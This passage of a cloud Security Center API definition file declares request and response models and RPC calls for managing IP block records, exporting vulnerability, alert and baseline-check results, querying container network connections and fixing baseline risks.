          targetType?: string(name='TargetType', description='The object type. Valid values:

*   **uuid**', example='uuid'),
        }
      ](name='TargetList', description='An array consisting of the servers on which the web directories are scanned.'),
      webPath?: string(name='WebPath', description='The path to the web directory.', example='/root/www****'),
      webPathType?: string(name='WebPathType', description='The path type of the web directory. Valid values:

*   **def**: automatically identified
*   **customize**: manually added', example='def'),
    }
  ](name='ConfigList', description='An array that consists of the paths to the web directories.'),
  count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='B37C9052-A73E-4707-A024-92477028****'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='2'),
}

model DescribeWebPathResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWebPathResponseBody(name='body'),
}

async function describeWebPath(request: DescribeWebPathRequest): DescribeWebPathResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeWebPath', 'POST', '/', 'json', false, 'json', request);
}

model DisableBruteForceRecordRequest {
  blockIp: string(name='BlockIp', description='The IP address that you want to specify in the policy.', example='8.210.XX.XX', position='Query'),
  bound?: string(name='Bound', description='The traffic direction that you want to specify in the policy. Valid values:

*   **in**: inbound
*   **out**: outbound', example='in', position='Query'),
  id?: long(name='Id', description='The ID of the IP address blocking policy.

> You can call the [DescribeBruteForceRecords](~~DescribeBruteForceRecords~~) operation to query the policy ID.', example='114166XX', position='Query'),
  port?: string(name='Port', description='The port number.', example='*/*', position='Query'),
  resourceOwnerId?: long(name='ResourceOwnerId', position='Query'),
  uuid: string(name='Uuid', description='The UUID of the server.', example='cbb9aa80-a8d1-443c-9ff0-2c36cd39****', position='Query'),
}

model DisableBruteForceRecordResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='5EFF53F7-9B2A-58B5-AD06-6B07ACE17133'),
}

model DisableBruteForceRecordResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DisableBruteForceRecordResponseBody(name='body'),
}

async function disableBruteForceRecord(request: DisableBruteForceRecordRequest): DisableBruteForceRecordResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DisableBruteForceRecord', 'POST', '/', 'json', false, 'json', request);
}

model DisableCustomBlockRecordRequest {
  blockIp: string(name='BlockIp', description='The IP address that is specified in the policy.

> You can call the [DescribeCustomBlockRecords](~~DescribeCustomBlockRecords~~) operation to query the IP address.', example='62.233.XX.XX', position='Query'),
  bound: string(name='Bound', description='The traffic direction that is specified in the policy. Valid values:

*   **in**: inbound
*   **out**: outbound', example='in', position='Query'),
  resourceOwnerId?: long(name='ResourceOwnerId', position='Query'),
}

model DisableCustomBlockRecordResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F749D54C-3CA0-5F68-835C-AD35A2BD29EA'),
}

model DisableCustomBlockRecordResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DisableCustomBlockRecordResponseBody(name='body'),
}

async function disableCustomBlockRecord(request: DisableCustomBlockRecordRequest): DisableCustomBlockRecordResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DisableCustomBlockRecord', 'POST', '/', 'json', false, 'json', request);
}

model EnableBruteForceRecordRequest {
  blockIp: string(name='BlockIp', description='The IP address that is specified in the policy.', example='61.155.XX.XX', position='Query'),
  bound?: string(name='Bound', description='The traffic direction that is specified in the policy. Valid values:

*   **in**: inbound
*   **out**: outbound', example='in', position='Query'),
  id?: long(name='Id', description='The ID of the policy that you want to enable.

> You can call the [DescribeBruteForceRecords](~~DescribeBruteForceRecords~~) operation to query the IDs of policies.', example='116602XX', position='Query'),
  port?: string(name='Port', description='The port number.', example='22/22', position='Query'),
  resourceOwnerId?: long(name='ResourceOwnerId', position='Query'),
  uuid: string(name='Uuid', description='The UUID of the server.', example='71046acb-8bff-4c3b-9163-24deb007****', position='Query'),
}

model EnableBruteForceRecordResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='DFAECA37-4660-5EB6-9A18-8FDF56B3****'),
}

model EnableBruteForceRecordResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: EnableBruteForceRecordResponseBody(name='body'),
}

async function enableBruteForceRecord(request: EnableBruteForceRecordRequest): EnableBruteForceRecordResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'EnableBruteForceRecord', 'POST', '/', 'json', false, 'json', request);
}

model EnableCustomBlockRecordRequest {
  blockIp: string(name='BlockIp', description='The IP address that is specified in the policy.', example='43.248.XX.XX', position='Query'),
  bound: string(name='Bound', description='The traffic direction that is specified in the policy. Valid values:

*   **in**: inbound
*   **out**: outbound', example='in', position='Query'),
  resourceOwnerId?: long(name='ResourceOwnerId', position='Query'),
}

model EnableCustomBlockRecordResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F02D5F26-70B9-53BD-9CDF-A316FD11****'),
}

model EnableCustomBlockRecordResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: EnableCustomBlockRecordResponseBody(name='body'),
}

async function enableCustomBlockRecord(request: EnableCustomBlockRecordRequest): EnableCustomBlockRecordResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'EnableCustomBlockRecord', 'POST', '/', 'json', false, 'json', request);
}

model EnableCustomInstanceBlockRecordRequest {
  blockIp: string(name='BlockIp', example='192.168.xx.xx', position='Query'),
  bound?: string(name='Bound', example='in', position='Query'),
  resourceOwnerId?: long(name='ResourceOwnerId', position='Query'),
  uuid: string(name='Uuid', example='50d213b4-3a35-427a-b8a5-04b0c7e1****', position='Query'),
}

model EnableCustomInstanceBlockRecordResponseBody = {
  requestId?: string(name='RequestId', example='571B2642-BF51-5BDD-906B-D2340DB9****'),
}

model EnableCustomInstanceBlockRecordResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: EnableCustomInstanceBlockRecordResponseBody(name='body'),
}

async function enableCustomInstanceBlockRecord(request: EnableCustomInstanceBlockRecordRequest): EnableCustomInstanceBlockRecordResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'EnableCustomInstanceBlockRecord', 'POST', '/', 'json', false, 'json', request);
}

model ExecStrategyRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  strategyId?: int32(name='StrategyId', description='The ID of the baseline check policy.

>  You can call the [DescribeStrategy](~~DescribeStrategy~~) operation to query the IDs of baseline check policies.', example='215421', position='Query'),
}

model ExecStrategyResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7F84EBCA-86F8-5AA0-BF74-A0276ECB****'),
}

model ExecStrategyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ExecStrategyResponseBody(name='body'),
}

async function execStrategy(request: ExecStrategyRequest): ExecStrategyResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ExecStrategy', 'POST', '/', 'json', false, 'json', request);
}

model ExportRecordRequest {
  exportType: string(name='ExportType', description='The type of the check result list to export. Valid values:

*   **assetInstance**: the list of servers displayed on the Host page
*   **user**: the list of fingerprints for accounts
*   **port**: the list of fingerprints for ports
*   **process**: the list of fingerprints for processes
*   **sca**: the list of fingerprints for middleware assets
*   **database**: the list of fingerprints for databases
*   **web**: the list of fingerprints for web services
*   **software**: the list of fingerprints for software assets
*   **cron**: the list of fingerprints for scheduled tasks
*   **autorun**: the list of fingerprints for startup items
*   **lkm**: the list of fingerprints for kernel modules
*   **webserver**: the list of fingerprints for websites
*   **imageVulExport**: the list of image system vulnerabilities
*   **imageBaseLineExport**: the list of check results for image baselines
*   **imageAffectedMaliciousExport**: the list of check results for malicious image samples
*   **baseline**: the list of check results for configuration assessment
*   **attack**: the list of alert events for attack analysis
*   **accessKey**: the list of alert events that are generated for AccessKey pair leaks', example='database', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  params?: string(name='Params', description='The conditions that are used to filter check results.

> This operation is a common export operation for multiple features of Security Center. The available configuration fields of this parameter vary based on the features. We recommend that you do not specify this parameter when you call the operation. You can export an information list without specifying this parameter, and then filter data in the exported Excel file.', example='{"extend":"1","currentPage":1,"pageSize":10}', position='Query'),
}

model ExportRecordResponseBody = {
  fileName?: string(name='FileName', description='The name of the exported file.', example='cms_20171101.xlsx'),
  id?: long(name='Id', description='The ID of the exported file.', example='131231'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='6673D49C-A9AB-40DD-B4A2-B92306701AE7'),
}

model ExportRecordResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ExportRecordResponseBody(name='body'),
}

/**
  * You can call the operation to export the following check result lists:
  * *   The list of servers on the Host page.
  * *   The lists of image system vulnerabilities, image application vulnerabilities, image baseline check results, and malicious image samples on the Image Security page.
  * *   The list of attack analysis data on the Attack Awareness page.
  * *   The list of check results for AccessKey pair leaks on the AK leak detection page.
  *
 */
async function exportRecord(request: ExportRecordRequest): ExportRecordResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ExportRecord', 'POST', '/', 'json', false, 'json', request);
}

model ExportSuspEventsRequest {
  assetsTypeList?: [ string ](name='AssetsTypeList', description='The types of assets.', position='Query'),
  clusterId?: string(name='ClusterId', description='The ID of the cluster that you want to query.

> You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of clusters.', example='c4af4fdf38a98496a9b63c2be5dae****', position='Query'),
  containerFieldName?: string(name='ContainerFieldName', description='The key of the condition that is used to query alert events on containers. Valid values:

*   **instanceId**: the ID of the asset
*   **appName**: the name of the application
*   **clusterId**: the ID of the cluster
*   **regionId**: the ID of the region
*   **nodeName**: the name of the node
*   **namespace**: the namespace
*   **clusterName**: the name of the cluster
*   **image**: the name of the image
*   **imageRepoName**: the name of the image repository
*   **imageRepoNamespace**: the namespace to which the image repository belongs
*   **imageRepoTag**: the tag that is added to the image
*   **imageDigest**: the digest of the image', example='clusterId', position='Query'),
  containerFieldValue?: string(name='ContainerFieldValue', description='The value of the condition that is used to query alert events on containers.', example='c819391d2d520485fa3e81e2dc2ea****', position='Query'),
  currentPage?: string(name='CurrentPage', description='The number of the page to return.', example='1', position='Query'),
  dealed?: string(name='Dealed', description='The status of the alert event. Valid values:

*   **N**: unhandled
*   **Y**: handled', example='Y', position='Query'),
  from?: string(name='From', description='The data source of the exception. Set the value to sas.', example='sas', position='Query'),
  id?: long(name='Id', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  levels?: string(name='Levels', description='The severity of the alert event. Separate multiple severities with commas (,). Valid values:

*   **serious**
*   **suspicious**
*   **remind**', example='serious,suspicious,remind', position='Query'),
  name?: string(name='Name', description='The complete name of the exception.', example='WEBSHELL', position='Query'),
  operateErrorCodeList?: [ string ](name='OperateErrorCodeList', position='Query'),
  pageSize?: string(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='20', position='Query'),
  parentEventTypes?: string(name='ParentEventTypes', description='The alert type of the alert event. Valid values:

*   **Suspicious process**
*   **Webshell**
*   **Unusual logon**
*   **Exception**
*   **Sensitive file tampering**
*   **Malicious process (cloud threat detection)**
*   **Suspicious network connection**
*   **Suspicious account**
*   **Application intrusion event**
*   **Cloud threat detection**
*   **Precise defense**
*   **Application whitelist**
*   **Persistent webshell**
*   **Web application threat detection**
*   **Malicious script**
*   **Threat intelligence**
*   **Malicious network activity**
*   **Cluster exception**
*   **Webshell (on-premises threat detection)**
*   **Vulnerability exploitation**
*   **Malicious process (on-premises threat detection)**
*   **Trusted exception**
*   **Others**', example='WEBSHELL', position='Query'),
  remark?: string(name='Remark', description='The remarks.', example='remark', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request. The value of this parameter is specified by the system.', example='127.0.XX.XX', position='Query'),
  status?: string(name='Status', description='The handling status of the exception. Valid values:

*   **0**: all status
*   **1**: pending handling
*   **2**: ignored
*   **4**: confirmed
*   **8**: marked as false positive
*   **16**: handling
*   **32**: handled
*   **64**: expired
*   **128**: deleted', example='0', position='Query'),
  targetType?: string(name='TargetType', description='The dimension from which you want to configure the feature. Valid values:

*   **uuid**: the UUID of the asset
*   **image_repo**: the ID of the image repository
*   **Cluster**: the ID of the cluster', example='uuid', position='Query'),
  timeEnd?: string(name='TimeEnd', description='The end of the time range during which the exception is detected.', example='2022-12-05 00:00:00', position='Query'),
  timeStart?: string(name='TimeStart', description='The beginning of the time range during which the exception is detected.', example='2022-10-01 00:00:00', position='Query'),
  uniqueInfo?: string(name='UniqueInfo', position='Query'),
  uuid?: string(name='Uuid', position='Query'),
}

model ExportSuspEventsResponseBody = {
  fileName?: string(name='FileName', description='The name of the exported file.', example='suspicious_event_20221209'),
  id?: int32(name='Id', description='The ID of the export record.', example='1'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='EF145C20-6A19-529A-8BDD-0671DXXXXXX'),
}

model ExportSuspEventsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ExportSuspEventsResponseBody(name='body'),
}

async function exportSuspEvents(request: ExportSuspEventsRequest): ExportSuspEventsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ExportSuspEvents', 'POST', '/', 'json', false, 'json', request);
}

model ExportVulRequest {
  aliasName?: string(name='AliasName', description='The name of the vulnerability.', example='RHSA-2019:3197-Important: sudo security update', position='Query'),
  attachTypes?: string(name='AttachTypes', description='The additional type of the vulnerabilities. You need to specify this parameter when you query application vulnerabilities. If you set the Type parameter to app, you must specify this parameter. Set the value to **sca**.

> If this parameter is set to **sca**, **application vulnerabilities** and the **vulnerabilities that are detected based on software component analysis** are queried. If you do not specify this parameter, only application vulnerabilities are queried.', example='sca', position='Query'),
  containerName?: string(name='ContainerName', description='要查询漏洞影响的容器名称。', example='xxljob-7b87597b99-mcskr', position='Query'),
  createTsEnd?: long(name='CreateTsEnd', description='首次扫描时间结束时间。
> 时间戳，单位为毫秒。', example='1696186800000', position='Query'),
  createTsStart?: long(name='CreateTsStart', description='首次扫描时间起始时间。
> 时间戳，单位为毫秒。', example='1696128144000', position='Query'),
  cveId?: string(name='CveId', example='CVE-2022-44702', position='Query'),
  dealed?: string(name='Dealed', description='Specifies whether the vulnerability is fixed. Valid values:

*   **y**: The vulnerability is fixed.
*   **n**: The vulnerability is not fixed.', example='n', position='Query'),
  groupId?: string(name='GroupId', description='The server group ID of the server on which the vulnerabilities are detected.

> You can call the [DescribeAllGroups](~~DescribeAllGroups~~) operation to query the IDs of server groups.', example='8834224', position='Query'),
  imageName?: string(name='ImageName', description='要查询漏洞影响的镜像名称。', example='container-***:****', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   zh: Chinese
*   en: English', example='zh', position='Query'),
  necessity?: string(name='Necessity', description='The priority to fix the vulnerability. Separate multiple priorities with commas (,). Valid values:

*   **asap**: high
*   **later**: medium
*   **nntf**: low', example='asap', position='Query'),
  path?: string(name='Path', description='要查询漏洞影响的进程路径。', example='/etc/test', position='Query'),
  searchTags?: string(name='SearchTags', description='The tag that is used to search for the vulnerabilities. Valid values:

*   Restart required
*   Remote exploitation
*   Exploit exists
*   Exploitable
*   Privilege escalation
*   Code execution', example='Restart required', position='Query'),
  type: string(name='Type', description='The type of the vulnerability that you want to export. Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability
*   **cms**: Web-CMS vulnerability
*   **app**: application vulnerability
*   **emg**: urgent vulnerability', example='app', position='Query'),
  uuids?: string(name='Uuids', description='The UUID of the server on which the vulnerabilities are detected. Separate multiple UUIDs with commas (,).', example='1587bedb-fdb4-48c4-9330-****', position='Query'),
  vpcInstanceIds?: string(name='VpcInstanceIds', description='The ID of the virtual private cloud (VPC) in which the vulnerabilities are detected. Separate multiple IDs with commas (,).

> You can call the [DescribeVpcList](~~DescribeVpcList~~) operation to query the IDs of VPCs.', example='ins-133****,ins-5414****', position='Query'),
}

model ExportVulResponseBody = {
  fileName?: string(name='FileName', description='The name of the exported file.', example='app_20211101'),
  id?: long(name='Id', description='The ID of the exported file.', example='81634'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='E1FAB2B8-DF4D-55DF-BC3D-5C3CA6FD5B13'),
}

model ExportVulResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ExportVulResponseBody(name='body'),
}

/**
  * You can call the ExportVul operation to export the following types of vulnerabilities: Linux software vulnerabilities, Windows system vulnerabilities, Web-CMS vulnerabilities, application vulnerabilities, and urgent vulnerabilities.
  * You can use this operation together with the DescribeVulExportInfo operation. After you call the ExportVul operation to create a vulnerability export task, you can call the DescribeVulExportInfo operation to query the progress of the task by specifying the ID of the task.
  * ### Limits
  * You can call this operation up to 10 times per second per account. If the number of the calls per second exceeds the limit, throttling is triggered. As a result, your business may be affected. We recommend that you take note of the limit when you call this operation.
  *
 */
async function exportVul(request: ExportVulRequest): ExportVulResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ExportVul', 'POST', '/', 'json', false, 'json', request);
}

model ExportWarningRequest {
  dealed?: string(name='Dealed', description='Specifies whether the baseline risks are handled. Valid values:

*   **Y**: yes
*   **N**: no', example='N', position='Query'),
  exportType?: string(name='ExportType', description='The type of the export task. Set the value to **hc_check_warning**, which indicates tasks to export baseline check results.', example='hc_check_warning', position='Query'),
  isCleartextPwd?: int32(name='IsCleartextPwd', description='The export method of the results for the weak password baseline check. Valid values:

*   **0**: exports the check results after it is masked.
*   **1**: exports the check results in plaintext.', example='0', position='Query'),
  isSummaryExport?: int32(name='IsSummaryExport', description='Specifies whether the baseline check results are aggregated and exported. Valid values:

*   **0**: no
*   **1**: yes', example='1', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  riskIds?: string(name='RiskIds', description='The ID of the risk item in the baseline check results. Separate multiple IDs with commas (,).', example='123,124', position='Query'),
  riskLevels?: string(name='RiskLevels', description='The severity of the baseline check item. Separate multiple severities with commas (,). Valid values:

*   **high**
*   **medium**
*   **low**', example='high,medium', position='Query'),
  riskName?: string(name='RiskName', description='The name of the baseline.', example='Alibaba Cloud Standard - Windows 2016/2019  Security Baseline', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.0.XX.XX', position='Query'),
  statusList?: string(name='StatusList', description='The status of the check item in the baseline check results. Separate multiple statuses with commas (,). Valid values:

*   **3**: passed
*   **1**: failed', example='1,3', position='Query'),
  strategyId?: long(name='StrategyId', description='The ID of the baseline check policy.', example='12', position='Query'),
  subTypeNames?: string(name='SubTypeNames', description='The subtypes of the baselines based on which baseline checks are performed. Separate multiple subtypes with commas (,).

> You must set the value of this parameter to the value of the **TypeName** parameter that is contained in the **SubTypes** parameter. You can call the [DescribeRiskType](~~DescribeRiskType~~) operation to obtain the value of the TypeName parameter.', example='hc_middleware_ack_master', position='Query'),
  typeName?: string(name='TypeName', description='The type of the baseline based on which baseline checks are performed.

> You must set the value of this parameter to the value of the **TypeName** parameter that is returned by calling the [DescribeRiskType](~~DescribeRiskType~~) operation. If both the **TypeName** and **TypeNames** parameters are specified, only the **TypeName** parameter takes effect.', example='hc_container', position='Query'),
  typeNames?: string(name='TypeNames', description='The types of the baselines based on which baseline checks are performed. Separate multiple types with commas (,).

> You must set the value of this parameter to the value of the **TypeName** parameter that is returned by calling the [DescribeRiskType](~~DescribeRiskType~~) operation. If both the **TypeName** and **TypeNames** parameters are specified, only the **TypeName** parameter takes effect.', example='hc_container,cis', position='Query'),
  uuids?: string(name='Uuids', description='The UUID of the server whose baseline check results you want to export. Separate multiple UUIDs with commas (,).', example='inet-7c676676-06fa-442e-90fb-b802e****,inet-7c676676-06fa-442e-90fb-b****', position='Query'),
}

model ExportWarningResponseBody = {
  fileName?: string(name='FileName', description='The name of the file that contains exported baseline check results.', example='health_check_export_20220407'),
  id?: long(name='Id', description='The ID of the task to export baseline check results.

> You can call use the value of this parameter to call the [DescribeHcExportInfo](~~DescribeHcExportInfo~~) operation to query the export progress.', example='439316'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='A7FC828B-C242-1005-9736-C7CC5DC09FF0'),
}

model ExportWarningResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ExportWarningResponseBody(name='body'),
}

async function exportWarning(request: ExportWarningRequest): ExportWarningResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ExportWarning', 'POST', '/', 'json', false, 'json', request);
}

model FindContainerNetworkConnectRequest {
  criteriaType?: string(name='CriteriaType', description='The type of the information that you want to query. Valid values:

*   **EDGE**: connection information', example='EDGE', position='Query'),
  currentPage?: long(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', position='Query'),
  dstNode?: {
    appName?: string(name='AppName', description='The name of the container application.', example='nginx-ingress-controller'),
    clusterId?: string(name='ClusterId', description='The ID of the container cluster.

> You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of container clusters.', example='f5x833820xx'),
    namespace?: string(name='Namespace', description='The namespace of the cluster.', example='default'),
    nodeIds?: [ string ](name='NodeIds', description='The node IDs.'),
    nodeType?: string(name='NodeType', description='The type of the node. Valid values:

*   **app**: application, which indicates that the node type is application.', example='app'),
    podName?: string(name='PodName', description='The name of the pod.', example='abc-deployment-yacs-31144-39265-1384966-7f8c8cd578-h6mhb'),
  }(name='DstNode', description='The information about the destination node.', shrink='json', position='Query'),
  endTime?: long(name='EndTime', description='The end time of the network connection.', example='1649260799999', position='Query'),
  pageSize?: long(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

> We recommend that you do not leave this parameter empty.', example='20', position='Query'),
  srcNode?: {
    appName?: string(name='AppName', description='The name of the container application.', example='arms-prometheus-ack-arms-prometheus'),
    clusterId?: string(name='ClusterId', description='The ID of the container cluster.

> You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of container clusters.', example='c56xxx1775dea0'),
    namespace?: string(name='Namespace', description='The namespace of the cluster.', example='default'),
    nodeIds?: [ string ](name='NodeIds', description='The node IDs.'),
    nodeType?: string(name='NodeType', description='The type of the node. Valid values:

*   **app**: application, which indicates that the node type is application.', example='app'),
    podName?: string(name='PodName', description='The name of the pod.', example='abc-deployment-yacs-31144-39265-1384966-7f8c8cd578-h6mhb'),
  }(name='SrcNode', description='The information about the source node.', shrink='json', position='Query'),
  startTime?: long(name='StartTime', description='The start time of the network connection.', example='1666886400000', position='Query'),
}

model FindContainerNetworkConnectResponseBody = {
  connects?: [ 
    {
      dstContainer?: {
        containerId?: string(name='ContainerId', description='The ID of the destination container.', example='48a6dxxx9d5a5866'),
      }(name='DstContainer', description='The information about the destination container.

> This parameter is not supported.'),
      dstIp?: string(name='DstIp', description='The destination IP address.', example='172.20.62.176'),
      dstPort?: string(name='DstPort', description='The destination port.', example='443'),
      firstTime?: long(name='FirstTime', description='The timestamp when the connection was first established.', example='2022-11-11 20:54:32'),
      id?: long(name='Id', description='The ID of the network connection.', example='1458'),
      lastTime?: long(name='LastTime', description='The timestamp when the connection was last established.', example='2022-11-24 10:26:00'),
      srcContainer?: {
        containerId?: string(name='ContainerId', description='The ID of the source container.', example='48a6xxx5709d5a5866'),
      }(name='SrcContainer', description='The information about the source container.

> This parameter is not supported.'),
      srcIp?: string(name='SrcIp', description='The source IP address.', example='35.233.62.116'),
      srcPort?: string(name='SrcPort', description='The source port.', example='10240'),
    }
  ](name='Connects', description='The information about the network connections.'),
  pageInfo?: {
    count?: long(name='Count', description='The number of entries returned on the current page.', example='10'),
    currentPage?: long(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: long(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
    totalCount?: long(name='TotalCount', description='The total number of entries returned.', example='12'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='8686CE6E-9BFA-5436-A9D9-77B984AEE7F8'),
}

model FindContainerNetworkConnectResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: FindContainerNetworkConnectResponseBody(name='body'),
}

async function findContainerNetworkConnect(request: FindContainerNetworkConnectRequest): FindContainerNetworkConnectResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'FindContainerNetworkConnect', 'POST', '/', 'json', false, 'json', request);
}

model FixCheckWarningsRequest {
  checkParams: string(name='CheckParams', description='The parameters for the baseline risk item that you want to fix.

*   **checkId**: the ID of the check item that corresponds to the baseline risk item.

*   **rules**: an array that consists of the rules applied to fixes.

    *   **value**: specifies whether a fix method is selected. Valid values: **0** and **1**. The value 0 indicates that no fix method is selected and the value 1 indicates that a fix method is selected.
    *   **ruleId**: the ID of the fix method.
    *   **paramList**: an array that consists of the details about the fix method.\\
        • **paramName**: the name of the fix method.\\
        • **value**: the value of the fix method.', example='[{"checkId":8,"rules":[{"ruleId":"rule.ssh_Idle.interval","value":1,"paramList":[{"paramName":"range_val","value":"600"},{"paramName":"range_val","value":"600"}]},{"ruleId":"rule.ssh_Idle.count","value":1,"paramList":[{"paramName":"range_val","value":"3"}]}]}]', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  riskId: long(name='RiskId', description='The ID of the baseline risk item.

>  To query specified baseline risk items and the check items of a specified server, you must provide the IDs of the baseline risk items. You can call the [DescribeCheckWarningSummary](~~DescribeCheckWarningSummary~~) operation to query the IDs.', example='10354', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='165.225.XX.XX', position='Query'),
  uuids: string(name='Uuids', description='The UUID of the asset for which you want to fix the baseline risk item. You can call the [DescribeWarningMachines](~~DescribeWarningMachines~~) operation to query the UUIDs of assets.', example='75a417dda5f25edb5bed8f208a9a****,c7e10fd794262a1510d5648f9e5d****', position='Query'),
}

model FixCheckWarningsResponseBody = {
  batchId?: long(name='BatchId', description='The ID of the baseline risk item that has been fixed by using the Batch Repair feature.', example='52370'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='76C1D7FD-DB1E-45EA-B804-3FBD9A1DD9C0'),
}

model FixCheckWarningsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: FixCheckWarningsResponseBody(name='body'),
}

async function fixCheckWarnings(request: FixCheckWarningsRequest): FixCheckWarningsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'FixCheckWarnings', 'POST', '/', 'json', false, 'json', request);
}

model GenerateOnceTaskRequest {
  param: string(name='Param', description='The additional information.', example='{"mode":1,"problemType":"offline","uuids":"inet-795dcad1-360f-49d2-b01e-b7da7f1c****"}', position='Query'),
  source?: string(name='Source', description='The source of the scan task.', example='Manual', position='Query'),
  taskName: string(name='TaskName', description='The name of the scan task. Valid values:

*   **CLIENT\\_PROBLEM_CHECK**: a client diagnosis task
*   **CLIENT\\_DEV_OPS**: an O\\&M task of Cloud Assistant
*   **ASSET\\_SECURITY_CHECK**: a task of asset information collection', example='CLIENT_PROBLEM_CHECK', position='Query'),
  taskType: string(name='TaskType', description='The type of the scan task. Valid values:

*   **CLIENT\\_PROBLEM_CHECK**: a client diagnosis task
*   **CLIENT\\_DEV_OPS**: an O\\&M task of Cloud Assistant
*   **ASSET\\_SECURITY_CHECK**: a task of asset information collection', example='CLIENT_PROBLEM_CHECK', position='Query'),
}

model GenerateOnceTaskResponseBody = {
  canCreate?: boolean(name='CanCreate', description='Indicates whether you can create more scan tasks. Valid values:

*   **true**: yes
*   **false**: no

> By default, a maximum of 10 scan tasks can be running at the same time. If 10 image scan tasks are running, you cannot create a scan task by calling this operation. You must wait for at least one of the 10 existing scan tasks to complete before you can create a scan task.', example='true'),
  collectTime?: long(name='CollectTime', description='The collection time.', example='1670307567000'),
  finishCount?: int32(name='FinishCount', description='The number of scan tasks that are complete.', example='61'),
  lastTask?: string(name='LastTask', description='The ID of the last scan task.', example='38730bb078f4a1461d4ed283994c****'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='8BB6B8FA-39E8-5654-A309-8EED13B1****'),
  taskId?: string(name='TaskId', description='The ID of the scan task.', example='38730bb078f4a1461d4ed283994c****'),
  totalCount?: int32(name='TotalCount', description='The total number of scan tasks.', example='100'),
}

model GenerateOnceTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GenerateOnceTaskResponseBody(name='body'),
}

async function generateOnceTask(request: GenerateOnceTaskRequest): GenerateOnceTaskResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GenerateOnceTask', 'POST', '/', 'json', false, 'json', request);
}

model GetAegisContainerPluginRuleCriteriaRequest {
